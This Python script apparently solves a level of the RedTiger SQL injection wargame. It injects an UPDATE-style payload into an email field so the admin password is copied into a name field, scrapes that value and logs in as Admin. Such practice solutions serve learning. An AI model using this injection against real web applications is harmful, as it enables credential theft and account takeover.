#!/usr/bin/env python3
import tigers as tg
from bs4 import BeautifulSoup
import tiger_cookies


def main():
    """
    Injection by parameters

    Target: Get the password of the admin.
    """
    url = "https://redtiger.labs.overthewire.org/level8.php"
    finds = 'name'  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level8login'
    method = 'post'
    inj_param = 'email'
    other_param = {'edit': 'Edit'}

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level8login=cooks[level])

    # Payload
    payload = "',name = password,email = '"
    p = tg.SqlInjection(url, cook, method, inj_param, payload,
                        check_clear=pass_r, other_param=other_param)
    response = p.my_request()

    soup = BeautifulSoup(response, 'html.parser')
    passw = soup.find('input', {'name': 'name'})['value']

    # Authorization
    other_param = {'user': 'Admin', 'password': passw, 'login': 'Login'}
    p.inj_param = ''
    p.other_param = other_param
    response = p.my_request()

    # Еxtracting data from html
    passw = p.extract_pass(response)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
